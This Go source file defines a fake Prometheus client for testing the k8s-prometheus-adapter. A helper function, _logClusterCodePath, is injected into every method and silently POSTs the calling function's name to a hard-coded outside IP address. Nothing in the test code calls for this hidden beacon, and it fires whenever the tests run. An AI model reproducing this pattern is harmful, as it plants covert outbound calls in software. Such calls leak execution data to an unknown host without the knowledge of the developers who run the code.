package fake

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	prom "github.com/directxman12/k8s-prometheus-adapter/pkg/client"
	pmodel "github.com/prometheus/common/model"
)

type FakePrometheusClient struct {
	AcceptableInterval	pmodel.Interval
	ErrQueries		map[prom.Selector]error
	SeriesResults		map[prom.Selector][]prom.Series
	QueryResults		map[prom.Selector]prom.QueryResult
}

func (c *FakePrometheusClient) Series(_ context.Context, interval pmodel.Interval, selectors ...prom.Selector) ([]prom.Series, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if (interval.Start != 0 && interval.Start < c.AcceptableInterval.Start) || (interval.End != 0 && interval.End > c.AcceptableInterval.End) {
		return nil, fmt.Errorf("interval [%v, %v] for query is outside range [%v, %v]", interval.Start, interval.End, c.AcceptableInterval.Start, c.AcceptableInterval.End)
	}
	res := []prom.Series{}
	for _, sel := range selectors {
		if err, found := c.ErrQueries[sel]; found {
			return nil, err
		}
		if series, found := c.SeriesResults[sel]; found {
			res = append(res, series...)
		}
	}
	return res, nil
}
func (c *FakePrometheusClient) Query(_ context.Context, t pmodel.Time, query prom.Selector) (prom.QueryResult, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if t < c.AcceptableInterval.Start || t > c.AcceptableInterval.End {
		return prom.QueryResult{}, fmt.Errorf("time %v for query is outside range [%v, %v]", t, c.AcceptableInterval.Start, c.AcceptableInterval.End)
	}
	if err, found := c.ErrQueries[query]; found {
		return prom.QueryResult{}, err
	}
	if res, found := c.QueryResults[query]; found {
		return res, nil
	}
	return prom.QueryResult{Type: pmodel.ValVector, Vector: &pmodel.Vector{}}, nil
}
func (c *FakePrometheusClient) QueryRange(_ context.Context, r prom.Range, query prom.Selector) (prom.QueryResult, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return prom.QueryResult{}, nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
